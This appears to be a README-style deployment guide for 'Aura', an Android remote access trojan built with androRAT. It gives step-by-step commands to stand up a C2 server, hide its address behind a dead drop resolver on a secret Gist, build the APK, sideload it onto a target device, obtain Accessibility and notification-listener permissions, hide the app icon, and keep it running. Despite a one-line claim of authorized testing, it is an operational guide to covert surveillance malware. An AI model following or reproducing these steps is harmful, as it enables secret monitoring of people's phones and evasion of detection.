# Aura Deployment Guide

This guide provides step-by-step instructions for deploying the **Aura Surveillance Suite** for research and authorized penetration testing.

---

## 🏗️ 1. VPS Infrastructure Setup

**Recommended OS:** Ubuntu 22.04 LTS or 24.04 LTS.

### 1.1 Prerequisites
Login to your VPS via SSH and install the necessary dependencies:
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip git screen
```

### 1.2 Deploy C2 Server
Clone the repository and install the Python requirements:
```bash
git clone https://github.com/Asuna0xA/Aura.git aura
cd aura/server
# On Ubuntu 24.04, use this flag to bypass the externally-managed-environment error
pip3 install -r requirements.txt --break-system-packages
```

### 1.3 Configure Dashboard Password
Aura v3 now features a secure, password-protected dashboard. 
Before starting the server, edit the password in `config.py`:
```bash
nano config.py
# Change DASHBOARD_PASSWORD = "Aura-Elite-2026" to your own password.
```


### 1.4 Start the Server
Run the Flask API in the background using `screen` or `nohup`:
```bash
# Using nohup (logs to server.log)
nohup python3 app.py > server.log 2>&1 &
```
The server will start on port **8080** by default. Access the dashboard at:
`http://YOUR_VPS_IP:8080/dashboard`

---

## 📡 2. Dead Drop Resolver (DDR) Setup

To hide your C2 infrastructure, you must host your encoded VPS URL on a public page.

### 2.1 Encode Your URL
Use the provided `ddr_helper.py` on the server or your local machine:
```bash
python3 server/ddr_helper.py encode "http://YOUR_VPS_IP:8080"
```
**Output Example:** `[DDR_START]aHR0cDovLzE1OS42NS4xNDcuMzk6ODA4MA==[DDR_END]`

### 2.2 Host the Payload
1.  Create a **secret** GitHub Gist or a Pastebin.
2.  Paste the encoded string into the Gist.
3.  Get the **Raw** URL of the Gist (e.g., `https://gist.githubusercontent.com/raw/GIST_ID`).

---

## 📱 3. Android APK Compilation

### 3.1 Configure DDR URL
Open `Android_Code/app/src/main/java/com/example/reverseshell2/DeadDropResolver.java` and update the `DDR_URLS` array with your Raw Gist URL:
```java
private static final String[] DDR_URLS = {
    "https://gist.githubusercontent.com/raw/YOUR_GIST_ID",
};
```

### 3.2 Build the APK
Use the `androRAT.py` builder script to compile and sign the APK:
```bash
python3 androRAT.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.2.1.apk --icon
```
*(Note: Since we use DDR, the IP/Port passed to the builder are used only as fallbacks)*.

---

## 🚀 4. Deployment & Activation

1.  **Transfer**: Sideload the `Aura_v3.2.1.apk` onto the target device.
2.  **Permissions**: Follow the on-screen setup to grant **Accessibility Service**, **Notification Listener**, and **Schedule Exact Alarms** permissions.
3.  **Hide**: The app icon will automatically hide from the launcher after the first successful C2 handshake.
4.  **Confirm**: Check the Web Dashboard to see the new device appear in the list.

### 🛡️ Post-Install Hardening
For commercial-level persistence, ensure "Battery Optimization" is disabled for the app in the target system settings. **Aura v3.1**'s SyncAdapter will handle the rest of the persistence logic automatically.
